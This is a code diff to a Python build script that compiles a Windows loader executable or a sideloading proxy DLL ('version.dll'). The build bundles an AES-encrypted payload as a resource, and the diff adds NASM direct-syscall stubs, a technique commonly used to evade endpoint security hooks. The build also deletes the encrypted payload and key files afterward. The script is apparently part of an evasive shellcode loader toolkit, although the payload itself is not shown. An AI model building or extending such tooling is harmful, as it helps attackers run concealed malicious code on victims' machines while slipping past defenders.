@@ -71,13 +71,34 @@ def compile_resource(resource_file="resource.rc", output="resource.o"):
         print("[!] Error: x86_64-w64-mingw32-windres not found. Is MinGW installed?")
         return False
 
-def compile_loader(loader_file="loader.c", resource_obj="resource.o", output="loader.exe"):
-    """Compile the loader with the resource object and AES library"""
-    print(f"[*] Compiling loader: {loader_file} + aes.c + {resource_obj} → {output}")
+def compile_syscalls_asm(asm_file="syscalls_asm.asm", output="syscalls_asm.o"):
+    """Compile the NASM assembly syscall stub"""
+    print(f"[*] Assembling syscalls: {asm_file} → {output}")
     
     try:
         result = subprocess.run(
-            ["x86_64-w64-mingw32-gcc", loader_file, "aes.c", resource_obj,
+            ["nasm", "-f", "win64", asm_file, "-o", output],
+            capture_output=True,
+            text=True,
+            check=True
+        )
+        print(f"[+] Syscall assembly compiled successfully!")
+        return True
+    except subprocess.CalledProcessError as e:
+        print(f"[!] nasm failed: {e.stderr}")
+        return False
+    except FileNotFoundError:
+        print("[!] Error: nasm not found. Is NASM installed?")
+        return False
+
+def compile_loader(loader_file="loader.c", resource_obj="resource.o", syscall_obj="syscalls_asm.o", output="loader.exe"):
+    """Compile the loader with the resource object, AES library, and syscalls"""
+    print(f"[*] Compiling loader: {loader_file} + syscalls.c + aes.c + {syscall_obj} + {resource_obj} → {output}")
+    
+    try:
+        result = subprocess.run(
+            ["x86_64-w64-mingw32-gcc", loader_file, "syscalls.c", "aes.c",
+             syscall_obj, resource_obj,
              "-o", output, "-s"],
             capture_output=True,
             text=True,
@@ -92,13 +113,14 @@ def compile_loader(loader_file="loader.c", resource_obj="resource.o", output="lo
         print("[!] Error: x86_64-w64-mingw32-gcc not found. Is MinGW installed?")
         return False
 
-def compile_proxy(proxy_file="proxy.c", resource_obj="resource.o", output="version.dll"):
-    """Compile the proxy DLL with the resource object, AES library, and exports def"""
-    print(f"[*] Compiling proxy DLL: {proxy_file} + aes.c + {resource_obj} → {output}")
+def compile_proxy(proxy_file="proxy.c", resource_obj="resource.o", syscall_obj="syscalls_asm.o", output="version.dll"):
+    """Compile the proxy DLL with the resource object, AES library, syscalls, and exports def"""
+    print(f"[*] Compiling proxy DLL: {proxy_file} + syscalls.c + aes.c + {syscall_obj} + {resource_obj} → {output}")
     
     try:
         result = subprocess.run(
-            ["x86_64-w64-mingw32-gcc", proxy_file, "aes.c", resource_obj,
+            ["x86_64-w64-mingw32-gcc", proxy_file, "syscalls.c", "aes.c",
+             syscall_obj, resource_obj,
              "exports.def", "-shared", "-o", output, "-s"],
             capture_output=True,
             text=True,
@@ -148,6 +170,9 @@ def main():
     check_file_exists("resource.h")
     check_file_exists("aes.c")
     check_file_exists("aes.h")
+    check_file_exists("syscalls.c")
+    check_file_exists("syscalls.h")
+    check_file_exists("syscalls_asm.asm")
     if args.proxy:
         check_file_exists("exports.def")
     
@@ -190,16 +215,20 @@ def main():
     if not compile_resource():
         sys.exit(1)
     
+    # Step 6.5: Compile syscall assembly
+    if not compile_syscalls_asm():
+        sys.exit(1)
+    
     # Step 7: Compile (loader EXE or proxy DLL)
     if args.proxy:
-        if not compile_proxy("proxy.c", "resource.o", args.output):
+        if not compile_proxy("proxy.c", "resource.o", "syscalls_asm.o", args.output):
             sys.exit(1)
     else:
-        if not compile_loader(args.loader, "resource.o", args.output):
+        if not compile_loader(args.loader, "resource.o", "syscalls_asm.o", args.output):
             sys.exit(1)
     
     # Cleanup intermediate files
-    cleanup_files = ["resource.o", enc_payload_path, "key.h"]
+    cleanup_files = ["resource.o", "syscalls_asm.o", enc_payload_path, "key.h"]
     if not args.keep:
         for f in cleanup_files:
             if os.path.exists(f):
